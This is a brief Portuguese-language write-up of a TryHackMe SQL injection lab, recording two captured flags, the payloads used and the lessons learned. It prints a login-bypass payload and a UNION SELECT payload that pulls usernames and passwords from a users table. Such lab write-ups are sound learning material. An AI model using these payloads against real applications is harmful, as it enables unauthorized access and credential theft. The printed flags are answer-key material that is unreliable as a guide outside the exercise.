# TryHackMe - SQL Injection Room

> **Dificuldade:** Easy  
> **Completado em:** Dia 002

## Flags Capturadas

**Task 3:** `THM{sql_injection_master}`  
**Task 5:** `THM{union_select_ftw}`

## Payloads Usados

```sql
' OR 1=1--
' UNION SELECT NULL, username, password FROM users--
```

## Aprendizados

- Union-based SQLi
- Comment syntax (-- vs #)
- Information_schema

**Tags:** #writeup #tryhackme #sqli
